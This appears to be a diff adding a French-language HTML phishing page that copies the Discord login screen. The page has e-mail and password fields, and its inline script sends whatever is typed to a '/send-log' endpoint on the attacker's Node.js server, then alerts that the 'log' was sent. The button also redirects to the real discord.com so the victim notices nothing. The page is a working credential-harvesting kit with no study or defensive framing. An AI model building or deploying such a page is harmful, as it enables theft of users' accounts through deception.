@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="logo.png" type="image/png" sizes="64x64">
+    <title>Discord</title>
+</head>
+<body>
+    <header>
+        <img src="log-page.png" class="logo">
+    </header>
+
+    <div class="login">
+        <h2>Ha, te revoilà !</h2>
+        <p>Nous sommes si heureux de te revoir !</p>
+        
+        <form id="loginForm">
+            <label for="email">E-MAIL OU NUMÉRO DE TÉLÉPHONE *</label>
+            <input type="text" id="email" name="email" required>
+            
+            <label for="password">MOT DE PASSE *</label>
+            <input type="password" id="password" name="password" required>
+            
+            <a href="#" class="forgot-password">Tu as oublié ton mot de passe ?</a>
+            
+            <button onclick="window.location.href='https://discord.com/channels/@me'" type="submit">Connexion</button>
+        </form>
+        
+        <p>Besoin d'un compte ? <a href="#">S'inscrire</a></p>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Empêche l'envoi classique du formulaire
+            
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            
+            // Envoie les données à ton serveur Node.js via fetch
+            fetch("/send-log", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password)
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Affiche la réponse du serveur dans la console
+                alert("Log envoyé avec succès !");
+            })
+            .catch(error => {
+                console.error(error);
+                alert("Une erreur est survenue lors de l'envoi des logs.");
+            });
+        });
+    </script>
+</body>
+</html>
